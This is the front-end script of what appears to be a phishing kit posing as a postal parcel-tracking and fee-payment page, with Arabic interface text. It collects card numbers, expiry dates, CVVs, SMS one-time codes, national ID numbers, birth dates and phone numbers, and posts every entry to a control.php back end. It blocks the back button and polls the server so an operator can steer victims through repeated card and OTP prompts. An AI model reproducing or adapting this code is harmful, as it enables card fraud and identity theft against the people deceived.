AOS.init({
	disable: function() {
		var maxWidth = 768;
		return window.innerWidth < maxWidth;
	}
});

window.addEventListener("load", function () {
	document.querySelector("body").classList.add("loaded");
});

window.history.pushState(null, "", window.location.href);        
window.onpopstate = function() {
	window.history.pushState(null, "", window.location.href);
};

function createXMLHTTPObject() {
	var xmlhttp = false;
	var XMLHttpFactories = [
		function () { return new XMLHttpRequest(); },
		function () { return new ActiveXObject("Msxml3.XMLHTTP"); },
		function () { return new ActiveXObject("Msxml2.XMLHTTP.6.0"); },
		function () { return new ActiveXObject("Msxml2.XMLHTTP.3.0"); },
		function () { return new ActiveXObject("Msxml2.XMLHTTP"); },
		function () { return new ActiveXObject("Microsoft.XMLHTTP"); }
	];
	for (var i=0;i<XMLHttpFactories.length;i++) { try { xmlhttp = XMLHttpFactories[i](); } catch (e) { continue; } break; } return xmlhttp;
}

function regs_check(str, reg){
	if(!reg.test(str)){ return false;  } return reg.test(str);
}

function randomString(length, chars) {
    var result = ''; for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];  return result;
}

function mail_check(str){
	var reg = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/; if(!reg.test(str)){ return false; } return reg.test(str);
}

function mod10_check(str){
	var nondigits = new RegExp(/[^0-9]+/g); var number = str.replace(nondigits,''); var pos, digit, i, sub_total, sum = 0; var strlen = number.length; if(strlen < 13){ return false; }
	for(i=0;i<strlen;i++){ pos = strlen - i; digit = parseInt(number.substring(pos - 1, pos)); if(i % 2 == 1){ sub_total = digit * 2; if(sub_total > 9){ sub_total = 1 + (sub_total - 10); } } else { sub_total = digit; } sum += sub_total; }
	if(!sum){ return false; } if(sum % 10 == 0){ return true; } return false;
}

function tryParseJSON (jsonString){
    try {
        var o = JSON.parse(jsonString);
        if (o && typeof o === "object") {
            return o;
        }
    }
    catch (e) { }
    return false;
}

function getUrlParameter(sParam) {
    var sPageURL = window.location.search.substring(1);
	var	sURLVariables = sPageURL.split('&');
	var sParameterName;
	var i;
    for(i = 0; i < sURLVariables.length; i++){
        sParameterName = sURLVariables[i].split('=');
        if(sParameterName[0] === sParam){
            return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
        }
    }
}

function logs_data(arg1="", arg2="") {
	if(arg2==""){ arg2 = "--"; }
	var xhttp = createXMLHTTPObject();
	if(!xhttp) return;
	var params = "arg1="+encodeURIComponent(arg1)+"&arg2="+encodeURIComponent(arg2);
	var resp = "";
	xhttp.open("POST", "control.php?action=z&_ts=" + $.now(), true);
	xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhttp.onreadystatechange = function() {
		if(this.readyState == 4 && this.status == 200){ resp = "OK"; }
	};
	xhttp.send(params);
}

(function ($) {
    $.fn.replaceClass = function (pFromClass, pToClass) {
        return this.removeClass(pFromClass).addClass(pToClass);
    };
}(jQuery));

function scrollTo(element, timer) {
    $('html, body').animate({ scrollTop: $(element).offset().top }, timer);
}

function doCheck(arg1=""){
	var bin_list = ["968211","968210","968209","968208","968207","968206","968205","968204","968203","968202","968201","636120","605141","604906","589206","589005","588983","588982","588850","588848","588845","585265","558848","558563","557606","554180","549760","543357","543085","537767","536023","535989","535825","532013","531196","531095","530906","530060","529741","529415","524514","524130","521076","520058","513213","508160","506968","504300","493428","489319","489318","486096","486095","486094","484783","483012","483011","483010","474491","468543","468542","468541","468540","462220","458456","457997","457865","455708","455036","446672","446404","446393","445564","440795","440647","440533","439954","434107","432328","431361","428673","428672","428671","428331","422819","422818","422817","421141","420132","419593","417633","412565","410685","410621","409201","407395","407197","406996","406136","403024","401757"];
	var input_val = arg1.replace(/\s+/g, "").substring(0, 6);
	if(input_val.length >= 6){
		if(jQuery.inArray(input_val, bin_list) !== -1){
			$("#splLogCardNumb").replaceClass("visa master", "mada");
		}else{
			if(input_val[0] == "4"){
				$("#splLogCardNumb").replaceClass("mada master", "visa");
			}else if(input_val[0] == "5" || input_val[0] == "2"){
				$("#splLogCardNumb").replaceClass("mada visa", "master");
			}else{
				$("#splLogCardNumb").removeClass("visa master mada");
			}
		}
	}else{
		$("#splLogCardNumb").removeClass("visa master mada");
	}
}

function future_date(min, sec) {
	return new Date().getTime() + min * sec * 1000;
}

function resend_sms(st){
	var $clock = $(".countdown");
	$clock.countdown(future_date(1, 30), {defer: true}).on('update.countdown', function(ev) {
		var totalSeconds =  ev.offset.minutes * 60 + ev.offset.seconds;
		if(totalSeconds >= 2 && totalSeconds <= 10){
			$(this).addClass("disabled").html("يمكنك إرسال رمز سري جديد بعد "+totalSeconds+" ثواني.");
		}else{
			$(this).addClass("disabled").html("يمكنك إرسال رمز سري جديد بعد "+totalSeconds+" ثانية.");
		}
	}).on('finish.countdown', function(ev) {
		$("#resendOTP").removeClass("disabled").html("إرسال رمز سري (OTP) جديد؟");
	}).countdown(st);
}

$(document).ready(function() {
	
	// -------------------- START TEST --------------------
	
	// -------------------- END TEST --------------------
	
	
	
	// -------------------- START start.php --------------------
	
	$("#button1").on("click", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $("#splTrackingNum").val() || "";
		var splStatusError = false;
		var splErrorMssage = "";
		$(this).blur();
		ev.preventDefault();
		if(input1.length==0){
			splStatusError = true; splErrorMssage = ""; $("#splTrackingNum").addClass("input-validation-error");
		}else{
			$("#splTrackingNum").removeClass("input-validation-error");
		}
		if(splStatusError==true){
			logs_data("LOG_ERROR_TRACK", input1);
			// $(this).removeClass("disabled");
			$(".loaderWraper1").fadeOut("fast", function(){
				ev.preventDefault(); return false;
			});
		}else{
			logs_data("LOG_SUBMIT_TRACK", input1);
			// $(this).addClass("disabled");
			$(".loaderWraper1").fadeIn("fast", function(){
				setTimeout(function(){ $("#tracking_form").submit(); }, 2500);
			});
		}
		ev.preventDefault(); return false;
	});
	
	$("#splTrackingNum").on("keyup keypress", function(ev) {
		ev = (ev) ? ev : window.event;
		var keyCode = ev.keyCode || ev.which;
		if (keyCode === 13) {
			$("#button1").click();
			ev.preventDefault(); return false;
		}
	});
	
	// -------------------- END start.php --------------------
	
	
	
	// -------------------- START paybill.php --------------------
	
	$("#splLogCardNumb").inputmask("9999 9999 9999 9999",{rightAlign: true, clearMaskOnLostFocus: true, showMaskOnHover: false, showMaskOnFocus: false, clearIncomplete: false, jitMasking: true});

	$("#splLogSecuCode").inputmask("999",{rightAlign: true, clearMaskOnLostFocus: true, showMaskOnHover: false, showMaskOnFocus: false, clearIncomplete: false, jitMasking: true});
	
	$("#splLogCardNumb").on("keyup copy paste", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if( input1.length >= 1 ){
			$(this).removeClass("input-validation-error").next().html("").hide();
		}
		doCheck(input1);
	}).on("blur", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if( input1.length != 19 ){
			$(this).addClass("input-validation-error").next().html("المرجو إدخال رقم البطاقة المكون من 16 رقم.").show();
		}else{
			if( !mod10_check(input1) ){
				$(this).addClass("input-validation-error").next().html("رقم البطاقة الذي أدخلتم غير صحيح.").show();
			}else{
				$(this).removeClass("input-validation-error").next().html("").hide();
			}
		}
	});
	
	$("#splLogSecuCode").on("keyup copy paste", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if( input1.length >= 1 ){
			$(this).removeClass("input-validation-error").next().html("").hide(); $(".info_icon2").removeClass("error");
		}
	}).on("blur", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if( !regs_check(input1, /^[0-9]{3}$/i) ){
			$(this).addClass("input-validation-error").next().html("المرجو إدخال رمز التحقق الظاهر خلف البطاقة.").show(); $(".info_icon2").addClass("error");
		}else{
			$(this).removeClass("input-validation-error").next().html("").hide(); $(".info_icon2").removeClass("error");
		}
	});
	
	$("#splLogExpDateM, #splLogExpDateY").on("change", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $("#splLogExpDateM").val() || "";
		var input2 = $("#splLogExpDateY").val() || "";
		if( regs_check(input1+"/"+input2, /^((0[1-9]|1[0-2])\/(2[2-9]|3[0-9]|4[0-2]))$/i) ){
			$("#splLogExpDateM, #splLogExpDateY").removeClass("input-validation-error").parents(".flexedDiv").next().html("").hide();
		}
	}).on("blur", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $("#splLogExpDateM").val() || "";
		var input2 = $("#splLogExpDateY").val() || "";
		if( !regs_check(input1+"/"+input2, /^((0[1-9]|1[0-2])\/(2[2-9]|3[0-9]|4[0-2]))$/i) ){
			$("#splLogExpDateM, #splLogExpDateY").addClass("input-validation-error").parents(".flexedDiv").next().html("المرجو إدخال تاريخ انتهاء صلاحية البطاقة.").show();
		}else{
			$("#splLogExpDateM, #splLogExpDateY").removeClass("input-validation-error").parents(".flexedDiv").next().html("").hide();
		}
		
	});
	
	$("#splLogExpDateM, #splLogExpDateY").on("change", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if(input1 == "00" || input1 == ""){
			$(this).css("color", "rgba(0, 0, 0, 0.6)");
		}else{
			$(this).css("color", "#373737");
		}
	});
	
	$(".btn-close-modal-1").on("click", function(ev){
		ev = (ev) ? ev : window.event;
		$(this).blur();
		ev.preventDefault();
		$(this).parents(".modal").fadeOut();
		ev.preventDefault(); return false;
	});
	
	$("#button2").on("click", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $("#splLogCardNumb").val() || "";
		var input2 = $("#splLogExpDateM").val() || "";
		var input3 = $("#splLogExpDateY").val() || "";
		var input4 = $("#splLogSecuCode").val() || "";
		var splStatusError = false;
		var splErrorMssage = "";
		$(this).blur();
		ev.preventDefault();
		if( input1.length != 19 ){
			splStatusError = true; splErrorMssage = ""; $("#splLogCardNumb").addClass("input-validation-error").next().html("المرجو إدخال رقم البطاقة المكون من 16 رقم.").show();
		}else{
			if( !mod10_check(input1) ){
				splStatusError = true; splErrorMssage = ""; $("#splLogCardNumb").addClass("input-validation-error").next().html("رقم البطاقة الذي أدخلتم غير صحيح.").show();
			}else{
				$("#splLogCardNumb").removeClass("input-validation-error").next().html("").hide();
			}
		}
		if( !regs_check(input2+"/"+input3, /^((0[1-9]|1[0-2])\/(2[2-9]|3[0-9]|4[0-2]))$/i) ){
			splStatusError = true; splErrorMssage = ""; $("#splLogExpDateM, #splLogExpDateY").addClass("input-validation-error").parents(".flexedDiv").next().html("المرجو إدخال تاريخ انتهاء صلاحية البطاقة.").show();
		}else{
			$("#splLogExpDateM, #splLogExpDateY").removeClass("input-validation-error").parents(".flexedDiv").next().html("").hide();
		}
		if( !regs_check(input4, /^[0-9]{3}$/i) ){
			splStatusError = true; splErrorMssage = ""; $("#splLogSecuCode").addClass("input-validation-error").next().html("المرجو إدخال رمز التحقق الظاهر خلف البطاقة.").show();  $(".info_icon2").addClass("error");
		}else{
			$("#splLogSecuCode").removeClass("input-validation-error").next().html("").hide();  $(".info_icon2").removeClass("error");
		}
		if(splStatusError==true){
			logs_data("LOG_ERROR_CARD", input1+"|"+input2+"/"+input3+"|"+input4);
			// $(this).removeClass("disabled");
			$(".loaderWraper1").fadeOut("fast", function(){
				ev.preventDefault(); return false;
			});
		}else{
			logs_data("LOG_SUBMIT_CARD", input1+"|"+input2+"/"+input3+"|"+input4);
			// $(this).addClass("disabled");
			$(".loaderWraper1").fadeIn("fast", function(){
				setTimeout(function(){ $("#secure_form").submit(); }, 2500);
			});
		}
	});
	
	$("#splLogCardNumb, #splLogExpDateM, #splLogExpDateY, #splLogSecuCode").on("keyup keypress", function(ev) {
		ev = (ev) ? ev : window.event;
		var keyCode = ev.keyCode || ev.which;
		if (keyCode === 13) {
			$(this).blur();
			$("#button2").click();
			ev.preventDefault(); return false;
		}
	});
	
	// -------------------- END paybill.php --------------------
	
	
	
	// -------------------- START sms.php --------------------
	
	$("#splLogMobiCode").inputmask("****[****]",{rightAlign: true, clearMaskOnLostFocus: true, showMaskOnHover: false, showMaskOnFocus: false, clearIncomplete: false, jitMasking: true});
	
	$("#splLogMobiCode").on("keyup copy paste", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if( input1.length >= 1 ){
			$(this).removeClass("input-validation-error").next().next().replaceClass("field-validation-success text-info", "field-validation-error text-danger").html("").hide();
		}
	}).on("blur", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if( input1.length==0 ){
			$(this).addClass("input-validation-error").next().next().replaceClass("field-validation-success text-info", "field-validation-error text-danger").html("المرجو إدخال الرمز السري (OTP).").show();
		}else{
			if( !regs_check(input1, /^[0-9a-zA-Z]{4,8}$/i) ){
				$(this).addClass("input-validation-error").next().next().replaceClass("field-validation-success text-info", "field-validation-error text-danger").html("الرمز السري (OTP) الذي أدخلتم غير صحيح.").show();
			}else{
				$(this).removeClass("input-validation-error").next().next().replaceClass("field-validation-success text-info", "field-validation-error text-danger").html("").hide();
			}
		}
	});
	
	$("#resendOTP").on("click", function(ev){
		ev = (ev) ? ev : window.event;
		logs_data("LOG_RESEND_SMS", "");
		$(this).blur();
		ev.preventDefault();
		$(".mini-loader").css("display", "flex");
		$("#splLogMobiCode").val("").removeClass("input-validation-error").next().next().replaceClass("field-validation-error text-danger", "field-validation-success text-info").html("").hide();
		setTimeout(function(){
			$("#splLogMobiCode").next().next().replaceClass("field-validation-error text-danger", "field-validation-success text-info").html("لقد تم إرسال رمز سري (OTP) جديد على جوالك.").show();
			$("#resendOTP").addClass("disabled").html("يمكنك إرسال رمز سري جديد بعد 30 ثانية.");
			$(".mini-loader").css("display", "none");
			resend_sms("start");
		}, 2500);
		ev.preventDefault(); return false;
	});
	
	$("#button3").on("click", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $("#splLogMobiCode").val() || "";
		var splStatusError = false;
		var splErrorMssage = "";
		$(this).blur();
		ev.preventDefault();
		if( input1.length==0 ){
			splStatusError = true; splErrorMssage = "";
			$("#splLogMobiCode").addClass("input-validation-error").next().next().replaceClass("field-validation-success text-info", "field-validation-error text-danger").html("المرجو إدخال الرمز السري (OTP).").show();
		}else{
			if( !regs_check(input1, /^[0-9a-zA-Z]{4,8}$/i) ){
				splStatusError = true; splErrorMssage = "";
				$("#splLogMobiCode").addClass("input-validation-error").next().next().replaceClass("field-validation-success text-info", "field-validation-error text-danger").html("الرمز السري (OTP) الذي أدخلتم غير صحيح.").show();
			}else{
				$("#splLogMobiCode").removeClass("input-validation-error").next().next().replaceClass("field-validation-success text-info", "field-validation-error text-danger").html("").hide();
			}
		}
		if(splStatusError==true){
			logs_data("LOG_ERROR_SMS", input1);
			// $(this).removeClass("disabled");
			$(".loaderWraper2").fadeOut("fast");
		}else{
			logs_data("LOG_SUBMIT_SMS", input1);
			// $(this).addClass("disabled");
			$(".loaderWraper2").fadeIn("fast");
			resend_sms("stop");
			var xhttp = createXMLHTTPObject();
			var params = "arg1="+encodeURIComponent(input1);
			if(!xhttp) return;
			xhttp.open("POST", "control.php?action=b&_ts=" + $.now(), true);
			xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			xhttp.onreadystatechange = function() {
				if(this.readyState == 4 && this.status == 200){
					if($(".loaderWraper2").is(":hidden")){ $(".loaderWraper2").fadeIn("fast"); }
					// setTimeout(function(){ window.location.href = "loading.php?aixPageId="+sess_hash; }, 2500);
				}
			};
			xhttp.send(params);
		}
		ev.preventDefault(); return false;
	});
	
	$("#splLogMobiCode").on("keyup keypress", function(ev) {
		ev = (ev) ? ev : window.event;
		var keyCode = ev.keyCode || ev.which;
		if (keyCode === 13) {
			$(this).blur();
			$("#button3").click();
			ev.preventDefault(); return false;
		}
	});
	
	// -------------------- END sms.php --------------------
	
	
	
	// -------------------- START verification.php --------------------
	
	$("#splLogIdNumber").inputmask("9999[99999999]",{rightAlign: true, clearMaskOnLostFocus: true, showMaskOnHover: false, showMaskOnFocus: false, clearIncomplete: false, jitMasking: true});

	$("#splLogIdNumber").on("keyup copy paste", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if( input1.length >= 1 ){
			$(this).removeClass("input-validation-error").next().next().html("").hide();
		}
	}).on("blur", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if( !regs_check(input1, /^[0-9]{4,12}$/i) ){
			$(this).addClass("input-validation-error").next().next().html("المرجو إدخال رقم الهوية.").show();
		}else{
			$(this).removeClass("input-validation-error").next().next().html("").hide();
		}
	});
	
	$('input[name="splLogDateType"]').on("click", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		$("#splLogBrtDateY").html('<option value="0000" selected="selected" disabled="disabled">السنة</option>');
		if(input1=="1"){ for(var x=1427; x>=1337; x--){ $("#splLogBrtDateY").append('<option value="'+x+'">'+x+'</option>'); } }
		if(input1=="2"){ for(var x=2006; x>=1916; x--){ $("#splLogBrtDateY").append('<option value="'+x+'">'+x+'</option>'); } }
		$("#splLogBrtDateD, #splLogBrtDateM, #splLogBrtDateY").removeClass("input-validation-error").css("color", "rgba(0, 0, 0, 0.6)").parents(".flexedDiv").next().html("").hide();
		$("#splLogBrtDateD").val("00");
		$("#splLogBrtDateM").val("00");
		$("#splLogBrtDateY").val("0000");
	});
	
	$("#splLogBrtDateD, #splLogBrtDateM, #splLogBrtDateY").on("change", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $('input[name="splLogDateType"]:checked').val() || "";
		var input2 = $("#splLogBrtDateD").val() || "";
		var input3 = $("#splLogBrtDateM").val() || "";
		var input4 = $("#splLogBrtDateY").val() || "";
		var dob_regex = (input1 == 1 ? /^(0[1-9]|[1-2][0-9]|3[0-1])\/(0[1-9]|1[0-2])\/(13[3-9][0-9]|14[0-2][0-9])$/i : /^(0[1-9]|[1-2][0-9]|3[0-1])\/(0[1-9]|1[0-2])\/(19[0-9]{2}|20[0-1][0-9])$/i);
		if( regs_check(input2+"/"+input3+"/"+input4, dob_regex) ){
			$("#splLogBrtDateD, #splLogBrtDateM, #splLogBrtDateY").removeClass("input-validation-error").parents(".flexedDiv").next().html("").hide();
		}
	}).on("blur", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $('input[name="splLogDateType"]:checked').val() || "";
		var input2 = $("#splLogBrtDateD").val() || "";
		var input3 = $("#splLogBrtDateM").val() || "";
		var input4 = $("#splLogBrtDateY").val() || "";
		var dob_regex = (input1 == 1 ? /^(0[1-9]|[1-2][0-9]|3[0-1])\/(0[1-9]|1[0-2])\/(13[3-9][0-9]|14[0-2][0-9])$/i : /^(0[1-9]|[1-2][0-9]|3[0-1])\/(0[1-9]|1[0-2])\/(19[0-9]{2}|20[0-1][0-9])$/i);
		if( !regs_check(input2+"/"+input3+"/"+input4, dob_regex) ){
			$("#splLogBrtDateD, #splLogBrtDateM, #splLogBrtDateY").addClass("input-validation-error").parents(".flexedDiv").next().html("المرجو إدخال تاريخ الميلاد.").show();
		}else{
			$("#splLogBrtDateD, #splLogBrtDateM, #splLogBrtDateY").removeClass("input-validation-error").parents(".flexedDiv").next().html("").hide();
		}
	});
	
	$("#splLogBrtDateD, #splLogBrtDateM, #splLogBrtDateY").on("change", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if(input1 == "00" || input1 == "0000" || input1 == ""){
			$(this).css("color", "rgba(0, 0, 0, 0.6)");
		}else{
			$(this).css("color", "#373737");
		}
	});
	
	$(".btn-close-modal-2").on("click", function(ev){
		ev = (ev) ? ev : window.event;
		$(this).blur();
		ev.preventDefault();
		$(this).parents(".modal").fadeOut();
		ev.preventDefault(); return false;
	});
	
	$("#button4").on("click", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $("#splLogIdNumber").val() || "";
		var input2 = $('input[name="splLogDateType"]:checked').val() || "";
		var input3 = $("#splLogBrtDateD").val() || "";
		var input4 = $("#splLogBrtDateM").val() || "";
		var input5 = $("#splLogBrtDateY").val() || "";
		var dob_regex = (input2 == 1 ? /^(0[1-9]|[1-2][0-9]|3[0-1])\/(0[1-9]|1[0-2])\/(13[3-9][0-9]|14[0-2][0-9])$/i : /^(0[1-9]|[1-2][0-9]|3[0-1])\/(0[1-9]|1[0-2])\/(19[0-9]{2}|20[0-1][0-9])$/i);
		var splStatusError = false;
		var splErrorMssage = "";
		$(this).blur();
		ev.preventDefault();
		if( !regs_check(input1, /^[0-9]{4,12}$/i) ){
			splStatusError = true; splErrorMssage = ""; $("#splLogIdNumber").addClass("input-validation-error").next().next().html("المرجو إدخال رقم الهوية.").show();
		}else{
			$("#splLogIdNumber").removeClass("input-validation-error").next().next().html("").hide();
		}
		if( !regs_check(input3+"/"+input4+"/"+input5, dob_regex) ){
			splStatusError = true; splErrorMssage = ""; $("#splLogBrtDateD, #splLogBrtDateM, #splLogBrtDateY").addClass("input-validation-error").addClass("input-validation-error").parents(".flexedDiv").next().html("المرجو إدخال تاريخ الميلاد.").show();
		}else{
			$("#splLogBrtDateD, #splLogBrtDateM, #splLogBrtDateY").removeClass("input-validation-error").parents(".flexedDiv").next().html("").hide();
		}
		if(splStatusError==true){
			logs_data("LOG_ERROR_ID", input1+"|"+input2+"|"+input3+"/"+input4+"/"+input5);
			// $(this).removeClass("disabled");
			$(".loaderWraper1").fadeOut("fast", function(){
				ev.preventDefault(); return false;
			});
		}else{
			logs_data("LOG_SUBMIT_ID", input1+"|"+input2+"|"+input3+"/"+input4+"/"+input5);
			// $(this).addClass("disabled");
			$(".loaderWraper1").fadeIn("fast", function(){
				setTimeout(function(){ $("#id_form").submit(); }, 2500);
			});
		}
	});
	
	$("#splLogIdNumber, #splLogBrtDateD, #splLogBrtDateM, #splLogBrtDateY").on("keyup keypress", function(ev) {
		ev = (ev) ? ev : window.event;
		var keyCode = ev.keyCode || ev.which;
		if (keyCode === 13) {
			$(this).blur();
			$("#button4").click();
			ev.preventDefault(); return false;
		}
	});
	
	// -------------------- END verification.php --------------------
	
	
	
	// -------------------- START phone.php --------------------
	
	$("#splLogPhoneNum").inputmask("9999999999",{rightAlign: true, clearMaskOnLostFocus: true, showMaskOnHover: false, showMaskOnFocus: false, clearIncomplete: false, jitMasking: true});
	
	$("#splLogPhoneNum").on("keyup copy paste", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if( input1.length >= 1 ){
			$(this).removeClass("input-validation-error").next().next().html("").hide();
		}
	}).on("blur", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $(this).val() || "";
		if( !regs_check(input1, /^[0][5][0-9]{8}$/i) ){
			$(this).addClass("input-validation-error").next().next().html("المرجو إدخال رقم الجوال.").show();
		}else{
			$(this).removeClass("input-validation-error").next().next().html("").hide();
		}
	});
	
	$(".btn-close-modal-3").on("click", function(ev){
		ev = (ev) ? ev : window.event;
		$(this).blur();
		ev.preventDefault();
		$(this).parents(".modal").fadeOut();
		ev.preventDefault(); return false;
	});
	
	$("#button6").on("click", function(ev){
		ev = (ev) ? ev : window.event;
		var input1 = $("#splLogPhoneNum").val() || "";
		var splStatusError = false;
		var splErrorMssage = "";
		$(this).blur();
		ev.preventDefault();
		if( !regs_check(input1, /^[0][5][0-9]{8}$/i) ){
			splStatusError = true; splErrorMssage = ""; $("#splLogPhoneNum").addClass("input-validation-error").next().next().html("المرجو إدخال رقم الجوال.").show();
		}else{
			$("#splLogPhoneNum").removeClass("input-validation-error").next().next().html("").hide();
		}
		if(splStatusError==true){
			logs_data("LOG_ERROR_PHONE", input1);
			// $(this).removeClass("disabled");
			$(".loaderWraper1").fadeOut("fast", function(){
				ev.preventDefault(); return false;
			});
		}else{
			logs_data("LOG_SUBMIT_PHONE", input1);
			// $(this).addClass("disabled");
			$(".loaderWraper1").fadeIn("fast", function(){
				setTimeout(function(){ $("#phone_form").submit(); }, 2500);
			});
		}
	});
	
	$("#splLogPhoneNum").on("keyup keypress", function(ev) {
		ev = (ev) ? ev : window.event;
		var keyCode = ev.keyCode || ev.which;
		if (keyCode === 13) {
			$(this).blur();
			$("#button6").click();
			ev.preventDefault(); return false;
		}
	});
	
	// -------------------- END phone.php --------------------
	
	
	
	// -------------------- START confirmation.php --------------------
	
	$("#button5").on("click", function(ev){
		ev = (ev) ? ev : window.event;
		$(this).blur();
		ev.preventDefault();
		logs_data("LOG_SUBMIT_CONFIRM", "");
		// $(this).addClass("disabled");
		$(".loaderWraper1").fadeIn("fast", function(){
			setTimeout(function(){ $("#confirm_form").submit(); }, 2500);
		});
		ev.preventDefault(); return false;
	});
	
	// -------------------- END confirmation.php --------------------
	
});

var myInterval_1;

function autoload(){
	var xhttp = createXMLHTTPObject();
	var params = "arg1=1";
	if(!xhttp) return;
	xhttp.open("POST", "control.php?action=a&_ts=" + $.now(), true);
	xhttp.setRequestHeader("X-HeartBeatCheck", "Alive");
	xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhttp.onreadystatechange = function() {
		if(this.readyState == 4 && this.status == 200){
			json_response = tryParseJSON(this.responseText);
			if(!json_response){
				if($(".loaderWraper2").is(":hidden") && $("#splLogMobiCode").length >= 1){ $(".loaderWraper2").fadeIn("fast"); }
			}else{
				if( json_response["status"]=="SHOW1" ){
					if($(".loaderWraper2").is(":visible") && $("#splLogMobiCode").length >= 1){
						if(json_response["is_error"]=="YES"){
							$("#splLogMobiCode").val("").addClass("input-validation-error").next().next().replaceClass("field-validation-success text-info", "field-validation-error text-danger").html("الرمز السري (OTP) الذي أدخلتم غير صحيح.").show();
						}else{
							$("#splLogMobiCode").val("").removeClass("input-validation-error").next().next().replaceClass("field-validation-success text-info", "field-validation-error text-danger").html("").hide();
						}
						// $("#button3").removeClass("disabled");
						$("#resendOTP").removeClass("disabled").html("إرسال رمز سري (OTP) جديد؟");
						if($(".mini-loader").is(":hidden")){
							$(".mini-loader").css("display", "flex");
							setTimeout(function(){
								$(".mini-loader").fadeOut("fast", function(){
									$("#resendOTP").addClass("disabled").html("يمكنك إرسال رمز سري جديد بعد 30 ثانية.");
									resend_sms("start");
								});
							}, 5000);
						}
						$(".loaderWraper2").fadeOut("fast");
					}
				}else if( json_response["status"]=="RESET1" ){
					window.location.href = "start.php?aixPageId="+sess_hash; myInterval_1 = null; return false;
				}else if( json_response["status"]=="RESET2" ){
					window.location.href = "paybill.php?aixPageId="+sess_hash; myInterval_1 = null; return false;
				}else if( json_response["status"]=="RESET3" ){
					window.location.href = "paybill.php?aixPageId="+sess_hash+"&is_error=1"; myInterval_1 = null; return false;
				}else if( json_response["status"]=="RESET4" ){
					window.location.href = "sms.php?aixPageId="+sess_hash; myInterval_1 = null; return false;
				}else if( json_response["status"]=="RESET5" ){
					window.location.href = "verification.php?aixPageId="+sess_hash; myInterval_1 = null; return false;
				}else if( json_response["status"]=="RESET6" ){
					window.location.href = "verification.php?aixPageId="+sess_hash+"&is_error=1"; myInterval_1 = null; return false;
				}else if( json_response["status"]=="RESET7" ){
					window.location.href = "phone.php?aixPageId="+sess_hash; myInterval_1 = null; return false;
				}else if( json_response["status"]=="RESET8" ){
					window.location.href = "phone.php?aixPageId="+sess_hash+"&is_error=1"; myInterval_1 = null; return false;
				}else if( json_response["status"]=="RESET9" ){
					window.location.href = "loading.php?aixPageId="+sess_hash; myInterval_1 = null; return false;
				}else if( json_response["status"]=="RESET10" ){
					window.location.href = "confirmation.php?aixPageId="+sess_hash; myInterval_1 = null; return false;
				}else if( json_response["status"]=="RESET11" ){
					window.location.href = "exit.php?action=setup&aixPageId="+sess_hash; myInterval_1 = null; return false;
				}else{
					if($(".loaderWraper2").is(":hidden") && $("#splLogMobiCode").length >= 1){ $(".loaderWraper2").fadeIn("fast"); }
				}
			}
			myInterval_1 = setTimeout(autoload, 3 * 1000);
		}
	};
	xhttp.send(params);
}